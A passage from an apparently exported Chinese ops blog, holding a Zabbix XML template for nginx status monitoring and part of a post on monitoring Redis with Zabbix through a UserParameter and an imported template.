&lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;active&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections reading&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[reading]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;reading&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections waiting&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[waiting]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;waiting&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections writing&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[writing]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;writing&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status PING&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[ping]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;30&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;is live&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap&gt; &lt;name&gt;Service state&lt;/name&gt; &lt;/valuemap&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server accepts&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[accepts]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;accepts&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server handled&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[handled]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;handled&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server requests&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[requests]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;requests&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;/items&gt; &lt;discovery_rules/&gt; &lt;macros/&gt; &lt;templates/&gt; &lt;screens/&gt; &lt;/template&gt; &lt;/templates&gt; &lt;triggers&gt; &lt;trigger&gt; &lt;expression&gt;{Template App NGINX:nginx.status[ping].last()}=0&lt;/expression&gt; &lt;name&gt;nginx was down!&lt;/name&gt; &lt;url/&gt; &lt;status&gt;0&lt;/status&gt; &lt;priority&gt;4&lt;/priority&gt; &lt;description&gt;NGINX&#x8FDB;&#x7A0B;&#x6570;&#xFF1A;0&#xFF0C;&#x8BF7;&#x6CE8;&#x610F;&lt;/description&gt; &lt;type&gt;0&lt;/type&gt; &lt;dependencies/&gt; &lt;/trigger&gt; &lt;/triggers&gt; &lt;graphs&gt; &lt;graph&gt; &lt;name&gt;nginx status connections&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[active]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[reading]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;0000C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[waiting]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;3&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C800C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[writing]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;nginx status server&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[accepts]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[handled]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;0000C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[requests]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;/graphs&gt;&lt;/zabbix_export&gt;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"},{"name":"nginx","slug":"nginx","permalink":"http://www.wangxin123.com/tags/nginx/"}]},{"title":"zabbix监控redis","slug":"zabbix监控redis","date":"2016-10-02T14:22:00.000Z","updated":"2016-11-18T01:17:04.159Z","comments":true,"path":"2016/10/02/zabbix监控redis/","link":"","permalink":"http://www.wangxin123.com/2016/10/02/zabbix监控redis/","excerpt":"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x70B9;&#x51FB;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;templates&#x3011;&#x2014;&#x2014;&gt;&#x3010;import&#x3011;&#xFF0C;&#x5BFC;&#x5165;xml&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002; &#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x65B0;&#x5EFA;/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x52A0;&#x5165;&#xFF1A;1UserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p $1 info|grep $2|cut -d : -f2 &#x91CD;&#x542F;&#x670D;&#x52A1;&#x5E94;&#x7528;&#x6700;&#x65B0;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;12#&#x6CE8;&#x610F;&#x786E;&#x8BA4;zabbix_agentd.conf&#x6587;&#x4EF6;UnsafeUserParameters=1 service zabbix-agent restart &#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x901A;&#x8FC7;zabbix_get&#x7A0B;&#x5E8F;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x80FD;&#x6B63;&#x5E38;&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x6B63;&#x5E38;&#x3002;12zabbix_get -s 172.20.0.20 -k redis_stats[6379,total_connections_received]2249669","keywords":null,"text":"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x70B9;&#x51FB;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;templates&#x3011;&#x2014;&#x2014;&gt;&#x3010;import&#x3011;&#xFF0C;&#x5BFC;&#x5165;xml&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002; &#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x65B0;&#x5EFA;/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x52A0;&#x5165;&#xFF1A;1UserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p $1 info|grep $2|cut -d : -f2 &#x91CD;&#x542F;&#x670D;&#x52A1;&#x5E94;&#x7528;&#x6700;&#x65B0;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;12#&#x6CE8;&#x610F;&#x786E;&#x8BA4;zabbix_agentd.conf&#x6587;&#x4EF6;UnsafeUserParameters=1 service zabbix-agent restart &#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x901A;&#x8FC7;zabbix_get&#x7A0B;&#x5E8F;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x80FD;&#x6B63;&#x5E38;&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x6B63;&#x5E38;&#x3002;12zabbix_get -s 172.20.0.20 -k redis_stats[6379,total_connections_received]2249669 &#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;&#x901A;&#x8FC7;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;hosts&#x3011;&#x2014;&#x2014;&gt;&#x3010;create host&#x3011;&#x521B;&#x5EFA;&#x65B0;&#x4E3B;&#x673A;&#xFF0C;&#x5E76;&#x5728;templates&#x9879;&#x4E2D;&#xFF0C;&#x67E5;&#x627E;Templates Redis_6379&#x6A21;&#x677F;&#xFF0C;&#x5E76;link&#x8BE5;&#x6A21;&#x677F;&#x3002; &#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x3010;monitoring&#x3011;&#x2014;&#x2014;&gt;&#x3010;lastest data&#x3011;&#xFF0C;&#x6253;&#x5F00;&#x521A;&#x521A;&#x6DFB;&#x52A0;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x6570;&#x636E;&#x3002; redis&#x76D1;&#x63A7;&#x6A21;&#x677F;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;zabbix_export&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;date&gt;2014-02-20T12:21:39Z&lt;/date&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;templates&gt; &lt;template&gt; &lt;template&gt;Templates Redis_6379&lt;/template&gt; &lt;name&gt;Templates Redis_6379&lt;/name&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;items&gt; &lt;item&gt; &lt;name&gt;Blocked clients_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connected clients_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connected slave_6380&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; 